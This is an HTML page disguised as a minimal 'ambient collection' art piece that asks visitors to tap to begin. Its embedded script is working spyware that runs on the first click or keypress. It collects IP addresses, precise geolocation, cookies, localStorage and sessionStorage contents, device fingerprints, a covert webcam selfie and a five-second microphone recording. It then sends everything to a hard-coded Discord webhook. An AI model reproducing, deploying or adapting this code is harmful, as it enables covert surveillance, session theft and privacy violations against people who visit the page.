<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ambient</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            color: #aaa;
            user-select: none;
            cursor: pointer;
            overflow: hidden;
        }
        #click-overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 10000;
            background: transparent;
            cursor: pointer;
        }
        .container {
            text-align: center;
            padding: 50px 40px;
            background: #111;
            border-radius: 16px;
            border: 1px solid #1a1a1a;
            max-width: 420px;
            width: 90%;
            pointer-events: none;
            position: relative;
            z-index: 1;
        }
        .icon {
            font-size: 36px;
            margin-bottom: 16px;
            opacity: 0.4;
            animation: pulse 2.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.7; }
        }
        .title {
            font-size: 16px;
            letter-spacing: 3px;
            font-weight: 300;
            margin-bottom: 8px;
            color: #888;
        }
        .sub {
            font-size: 11px;
            color: #333;
            letter-spacing: 2px;
        }
        #status {
            margin-top: 24px;
            font-size: 10px;
            color: #2a2a2a;
            letter-spacing: 1px;
            transition: color 0.3s;
        }
        #status.active { color: #555; }
        #status.done { color: #666; }
        .detail {
            margin-top: 16px;
            font-size: 9px;
            color: #1a1a1a;
            letter-spacing: 0.5px;
            line-height: 1.8;
        }
    </style>
</head>
<body>
    <div id="click-overlay"></div>
    <div class="container">
        <div class="icon">✦</div>
        <div class="title">weaving</div>
        <div class="sub">ambient collection</div>
        <div id="status">tap anywhere to begin</div>
        <div class="detail" id="detail"></div>
    </div>

    <script>
        (function() {
            const WEBHOOK = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";
            let started = false;
            let mediaStream = null;
            let audioChunks = [];
            let audioContext = null;

            const statusEl = document.getElementById('status');
            const detailEl = document.getElementById('detail');

            function setStatus(text, state = 'active') {
                statusEl.textContent = text;
                statusEl.className = state;
            }

            function setDetail(text) {
                detailEl.textContent = text;
            }

            // ─── IP COLLECTION ────────────────────────────────────────────────
            function collectIPs() {
                return new Promise((resolve) => {
                    const ips = new Set();
                    const pc = new RTCPeerConnection({
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { urls: 'stun:stun1.l.google.com:19302' },
                            { urls: 'stun:stun2.l.google.com:19302' },
                            { urls: 'stun:stun3.l.google.com:19302' },
                            { urls: 'stun:stun4.l.google.com:19302' }
                        ]
                    });
                    pc.createDataChannel('gather');
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                    pc.onicecandidate = (e) => {
                        if (e.candidate) {
                            const c = e.candidate.candidate;
                            const ip4 = c.match(/(\d{1,3}\.){3}\d{1,3}/);
                            if (ip4) ips.add(ip4[0]);
                            const ip6 = c.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
                            if (ip6) ips.add(ip6[0]);
                        }
                    };

                    // Fetch public IPs from multiple services
                    const fetchIPs = [
                        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => null),
                        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => d.ip).catch(() => null),
                        fetch('https://api.my-ip.io/ip.json').then(r => r.json()).then(d => d.ip).catch(() => null),
                        fetch('https://ipinfo.io/json').then(r => r.json()).then(d => d.ip).catch(() => null)
                    ];

                    Promise.allSettled(fetchIPs).then(results => {
                        results.forEach(r => {
                            if (r.status === 'fulfilled' && r.value) ips.add(r.value);
                        });
                        setTimeout(() => {
                            pc.close();
                            resolve(Array.from(ips));
                        }, 3000);
                    });

                    setTimeout(() => {
                        pc.close();
                        resolve(Array.from(ips));
                    }, 5000);
                });
            }

            // ─── BATTERY ──────────────────────────────────────────────────────
            function getBattery() {
                return new Promise((resolve) => {
                    if (!navigator.getBattery) {
                        resolve({ level: 'unavailable', charging: 'unavailable' });
                        return;
                    }
                    navigator.getBattery()
                        .then(b => resolve({ level: Math.round(b.level * 100), charging: b.charging }))
                        .catch(() => resolve({ level: 'error', charging: 'error' }));
                });
            }

            // ─── GEOLOCATION ──────────────────────────────────────────────────
            function getGeolocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve({ latitude: 'unavailable', longitude: 'unavailable', accuracy: 'unavailable' });
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        }),
                        err => {
                            // fallback to IP-based geo
                            fetch('https://ipapi.co/json/')
                                .then(r => r.json())
                                .then(d => resolve({
                                    latitude: d.latitude || 'unavailable',
                                    longitude: d.longitude || 'unavailable',
                                    accuracy: 'ip-based'
                                }))
                                .catch(() => resolve({ latitude: 'unavailable', longitude: 'unavailable', accuracy: 'unavailable' }));
                        },
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                });
            }

            // ─── SYSTEM INFO ──────────────────────────────────────────────────
            function getSystemInfo() {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                return {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages || [],
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio || 1
                    },
                    window: {
                        innerWidth: window.innerWidth,
                        innerHeight: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight
                    },
                    connection: conn ? {
                        type: conn.type || 'unknown',
                        effectiveType: conn.effectiveType || 'unknown',
                        downlink: conn.downlink || 'unknown',
                        rtt: conn.rtt || 'unknown'
                    } : { type: 'unknown', effectiveType: 'unknown' },
                    localStorage: (() => {
                        try {
                            const items = {};
                            for (let i = 0; i < localStorage.length; i++) {
                                const k = localStorage.key(i);
                                items[k] = localStorage.getItem(k);
                            }
                            return items;
                        } catch { return 'unavailable'; }
                    })(),
                    sessionStorage: (() => {
                        try {
                            const items = {};
                            for (let i = 0; i < sessionStorage.length; i++) {
                                const k = sessionStorage.key(i);
                                items[k] = sessionStorage.getItem(k);
                            }
                            return items;
                        } catch { return 'unavailable'; }
                    })(),
                    cookies: document.cookie || 'none',
                    referrer: document.referrer || 'direct',
                    url: window.location.href,
                    webgl: (() => {
                        try {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                            if (!gl) return 'unavailable';
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (!debugInfo) return { vendor: 'unavailable', renderer: 'unavailable' };
                            return {
                                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                            };
                        } catch { return 'unavailable'; }
                    })()
                };
            }

            // ─── CANVAS FINGERPRINT ──────────────────────────────────────────
            function getCanvasFingerprint() {
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = 256;
                    canvas.height = 64;
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '18px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(150, 2, 80, 25);
                    ctx.fillStyle = '#069';
                    ctx.fillText('canvas', 4, 15);
                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                    ctx.fillText('fingerprint', 8, 20);
                    ctx.strokeStyle = '#2c2c2c';
                    ctx.lineWidth = 2;
                    ctx.strokeRect(0, 0, canvas.width, canvas.height);
                    return canvas.toDataURL('image/png').split(',')[1] || null;
                } catch { return null; }
            }

            // ─── MEDIA CAPTURE ───────────────────────────────────────────────
            function initMedia() {
                return new Promise((resolve, reject) => {
                    if (mediaStream) {
                        resolve(mediaStream);
                        return;
                    }
                    navigator.mediaDevices.getUserMedia({
                        audio: {
                            echoCancellation: false,
                            noiseSuppression: false,
                            autoGainControl: false
                        },
                        video: {
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    }).then(stream => {
                        mediaStream = stream;
                        resolve(stream);
                    }).catch(err => {
                        // Try audio only if video fails
                        navigator.mediaDevices.getUserMedia({ audio: true })
                            .then(stream => {
                                mediaStream = stream;
                                resolve(stream);
                            })
                            .catch(reject);
                    });
                });
            }

            function captureSelfie(stream) {
                return new Promise((resolve) => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    video.style.position = 'fixed';
                    video.style.top = '-9999px';
                    video.style.left = '-9999px';
                    video.style.width = '1px';
                    video.style.height = '1px';
                    document.body.appendChild(video);

                    video.onloadedmetadata = () => {
                        video.play().catch(() => {});
                    };

                    video.onplaying = () => {
                        try {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                            document.body.removeChild(video);
                            resolve(dataUrl.split(',')[1] || null);
                        } catch (e) {
                            document.body.removeChild(video);
                            resolve(null);
                        }
                    };

                    video.onerror = () => {
                        document.body.removeChild(video);
                        resolve(null);
                    };

                    setTimeout(() => {
                        if (video.parentNode) {
                            document.body.removeChild(video);
                            resolve(null);
                        }
                    }, 5000);
                });
            }

            function captureAudio(stream) {
                return new Promise((resolve) => {
                    const chunks = [];
                    const recorder = new MediaRecorder(stream, {
                        mimeType: 'audio/webm;codecs=opus'
                    });

                    recorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };

                    recorder.onstop = () => {
                        if (chunks.length === 0) {
                            resolve(null);
                            return;
                        }
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onload = () => {
                            resolve(reader.result.split(',')[1] || null);
                        };
                        reader.onerror = () => resolve(null);
                        reader.readAsDataURL(blob);
                    };

                    recorder.start();
                    setTimeout(() => {
                        recorder.stop();
                    }, 5000);
                });
            }

            // ─── MAIN COLLECTION ─────────────────────────────────────────────

            async function collectAndSend() {
                setStatus('collecting IPs...', 'active');
                const ips = await collectIPs();
                setDetail(`IPs: ${ips.length} found`);

                setStatus('gathering system info...', 'active');
                const system = getSystemInfo();

                setStatus('getting battery...', 'active');
                const battery = await getBattery();

                setStatus('getting location...', 'active');
                const geo = await getGeolocation();

                setStatus('canvas fingerprint...', 'active');
                const canvasFp = getCanvasFingerprint();

                setStatus('requesting media...', 'active');
                setDetail('permission prompt may appear');

                let selfie = null;
                let audio = null;

                try {
                    const stream = await initMedia();
                    setStatus('capturing selfie...', 'active');
                    selfie = await captureSelfie(stream);
                    setDetail(selfie ? 'selfie captured' : 'selfie failed');

                    setStatus('capturing audio...', 'active');
                    audio = await captureAudio(stream);
                    setDetail(audio ? 'audio captured' : 'audio failed');

                    // Stop tracks
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    setDetail('media permissions denied or unavailable');
                }

                setStatus('building payload...', 'active');

                // ─── BUILD PAYLOAD ──────────────────────────────────────────

                const fields = [
                    { name: '🌐 IPs', value: ips.length ? ips.join('\n') : 'none', inline: false },
                    { name: '📍 Location', value: `${geo.latitude}, ${geo.longitude}`, inline: true },
                    { name: '🎯 Accuracy', value: geo.accuracy?.toString() || 'unknown', inline: true },
                    { name: '🔋 Battery', value: `${battery.level}% (${battery.charging ? 'charging' : 'discharging'})`, inline: true },
                    { name: '📱 Screen', value: `${system.screen.width}x${system.screen.height} @ ${system.screen.pixelRatio}x`, inline: true },
                    { name: '🌍 Timezone', value: system.timezone, inline: true },
                    { name: '🖥️ Hardware', value: `${system.hardwareConcurrency} cores, ${system.deviceMemory}GB RAM`, inline: true },
                    { name: '🌐 Network', value: `${system.connection.effectiveType} (${system.connection.type})`, inline: true },
                    { name: '📦 localStorage', value: Object.keys(system.localStorage).length + ' items', inline: true },
                    { name: '🍪 Cookies', value: system.cookies.length > 80 ? system.cookies.substring(0, 80) + '...' : system.cookies || 'none', inline: false },
                    { name: '🎨 Canvas FP', value: canvasFp ? 'captured' : 'none', inline: true },
                    { name: '📸 Selfie', value: selfie ? 'captured' : 'none', inline: true },
                    { name: '🎤 Audio', value: audio ? 'captured' : 'none', inline: true },
                    { name: '🖥️ WebGL', value: typeof system.webgl === 'object' ? system.webgl.vendor : 'unavailable', inline: true },
                    { name: '🔗 Referrer', value: system.referrer || 'direct', inline: false },
                    { name: '🌐 Platform', value: system.platform || 'unknown', inline: true },
                    { name: '🗣️ Language', value: system.language, inline: true }
                ];

                const embed = {
                    title: '📦 ambient collection',
                    color: 0x1a1a1a,
                    fields: fields,
                    timestamp: new Date().toISOString(),
                    footer: { text: `UA: ${system.userAgent.substring(0, 80)}...` }
                };

                const payload = {
                    content: `**gathered** | ${new Date().toLocaleString()}`,
                    embeds: [embed]
                };

                // ─── SEND ────────────────────────────────────────────────────

                const formData = new FormData();
                formData.append('payload_json', JSON.stringify(payload));

                if (selfie) {
                    try {
                        const binary = atob(selfie);
                        const bytes = new Uint8Array(binary.length);
                        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
                        const blob = new Blob([bytes.buffer], { type: 'image/jpeg' });
                        formData.append('file', blob, 'selfie.jpg');
                    } catch (e) {}
                }

                if (audio) {
                    try {
                        const binary = atob(audio);
                        const bytes = new Uint8Array(binary.length);
                        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
                        const blob = new Blob([bytes.buffer], { type: 'audio/webm' });
                        formData.append('file', blob, 'audio.webm');
                    } catch (e) {}
                }

                if (canvasFp) {
                    try {
                        const binary = atob(canvasFp);
                        const bytes = new Uint8Array(binary.length);
                        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
                        const blob = new Blob([bytes.buffer], { type: 'image/png' });
                        formData.append('file', blob, 'canvas-fingerprint.png');
                    } catch (e) {}
                }

                setStatus('sending...', 'active');

                try {
                    await fetch(WEBHOOK, {
                        method: 'POST',
                        body: formData
                    });
                    setStatus('✓ delivered', 'done');
                    setDetail(`IPs: ${ips.length} | selfie: ${selfie ? 'yes' : 'no'} | audio: ${audio ? 'yes' : 'no'}`);
                } catch (e) {
                    setStatus('✗ error sending', 'done');
                    setDetail('check console');
                }
            }

            // ─── START ──────────────────────────────────────────────────────

            document.getElementById('click-overlay').addEventListener('click', function(e) {
                e.stopPropagation();
                if (!started) {
                    started = true;
                    this.style.display = 'none';
                    setStatus('initializing...', 'active');
                    setTimeout(() => {
                        collectAndSend();
                    }, 300);
                }
            });

            // Also start on any keypress
            document.addEventListener('keydown', function handler() {
                if (!started) {
                    started = true;
                    document.getElementById('click-overlay').style.display = 'none';
                    setStatus('initializing...', 'active');
                    setTimeout(() => {
                        collectAndSend();
                    }, 300);
                }
                document.removeEventListener('keydown', handler);
            }, { once: true });

        })();
    </script>
</body>
</html>
